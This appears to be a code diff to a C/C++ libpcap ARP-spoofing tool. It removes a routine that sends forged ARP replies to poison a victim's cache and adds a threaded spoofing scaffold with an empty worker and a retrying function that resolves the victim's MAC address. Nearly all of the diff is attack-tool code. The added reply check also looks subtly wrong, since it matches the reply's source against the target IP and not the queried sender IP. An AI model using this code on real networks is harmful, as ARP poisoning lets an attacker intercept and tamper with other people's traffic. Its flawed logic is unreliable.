@@ -14,6 +14,14 @@
 #define	ETHER_CRC_LEN		4	/* length of the Ethernet CRC */
 #define	ETHER_HDR_LEN		(ETHER_ADDR_LEN*2+ETHER_TYPE_LEN)
 
+typedef struct spoof_th_arg {
+    pcap_t *handle;
+    Mac my_mac;
+    Ip my_ip;
+    Ip sender_ip;
+    Ip target_ip;
+} spoof_th_arg;
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
 	EthHdr eth_;
@@ -21,44 +29,13 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-int get_my_mac(char *if_name, char *dst, size_t dst_size) {
-    struct ifreq s;
-    u_char *mac;
-    int fd;
+
+void * th_spoof_proc(void *arg) {
+    spoof_th_arg *spoof_info = (spoof_th_arg*)arg;
     
-    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
-        return -1;
-
-    strncpy(s.ifr_name, if_name, IFNAMSIZ);
-     
-    if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
-        return -2;
-    }
-
-    mac = (u_char*)s.ifr_addr.sa_data;
-    snprintf(dst, dst_size, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-    return 0;
+    return NULL;
 }
 
-
-
-int get_my_ip(char *if_name, char *dst, size_t dst_size) {
-    struct ifreq s;
-    u_char *mac;
-    int fd;
-    
-    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
-        return -1;
-   
-    strncpy(s.ifr_name, if_name, IFNAMSIZ);
-
-    if(ioctl(fd, SIOCGIFADDR, &s) < 0) {
-        return -2;
-    }
-
-    inet_ntop(AF_INET, (char*)s.ifr_addr.sa_data + sizeof(ushort), dst, dst_size);
-    return 0;
-}
 
 int send_arp_packet(pcap_t *handle, int arp_op, Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip) {
     EthArpPacket packet;
@@ -90,32 +67,44 @@ int send_arp_packet(pcap_t *handle, int arp_op, Mac dmac, Mac smac, Mac tmac, Ip
 }
 
 
-int proc_arp_attack(pcap_t *handle, char *my_mac, char *my_ip, char *sender_ip, char *target_ip) {
+int get_sender_mac(pcap_t *handle, Mac my_mac, Ip my_ip, Ip sender_ip, Ip target_ip, Mac *out) {
     Mac sender_mac;
     struct ArpHdr *arpHdr;
+    struct pcap_pkthdr* header;
+    const u_char* pkt;
 
-    if(send_arp_packet(handle,  ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), Mac(my_mac), Mac("00:00:00:00:00:00"), Ip(my_ip), Ip(sender_ip)) != 0)
-        return -1;
-    
+    const int MAX_TRY = 5;
+    const int MAX_TIME = 4; // secs
 
-    while (true) {
-        struct pcap_pkthdr* header;
-        const u_char* pkt;
-        int res = pcap_next_ex(handle, &header, &pkt);
-        if (res == 0) continue;
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
-        }
+    int start;
+    int res;
 
-        arpHdr = (struct ArpHdr*)(pkt + ETHER_HDR_LEN);
-        if(arpHdr->op_ == htons(ArpHdr::Reply)) {
-            memcpy(reinterpret_cast<uint8_t*>(&sender_mac), reinterpret_cast<uint8_t*>(&arpHdr->smac_), arpHdr->smac_.SIZE);
-            break;
+    for(int i=0; i < MAX_TRY; i++) {
+        if(send_arp_packet(handle,  ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), my_mac, Mac("00:00:00:00:00:00"), my_ip, sender_ip) != 0)
+            return -1;
+        
+        start = time(0);
+        while (true) {
+            if(time(0) - start > MAX_TIME)
+                break;
+                
+            res = pcap_next_ex(handle, &header, &pkt);
+            if (res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+                break;
+            }
+
+            arpHdr = (struct ArpHdr*)(pkt + ETHER_HDR_LEN);
+
+            if( arpHdr->op_ == htons(ArpHdr::Reply) &&
+                target_ip == arpHdr->sip() &&
+                my_ip == arpHdr->tip_ && my_mac == arpHdr->tmac()
+            ) {
+                memcpy(reinterpret_cast<uint8_t*>(out), reinterpret_cast<uint8_t*>(&arpHdr->smac_), arpHdr->smac_.SIZE);
+                return 0;
+            }
         }
     }
-
-    if(send_arp_packet(handle,  ArpHdr::Reply, sender_mac, Mac(my_mac), sender_mac, Ip(target_ip), Ip(sender_ip)) != 0)
-        return -1;
-
+    return -1;
 }
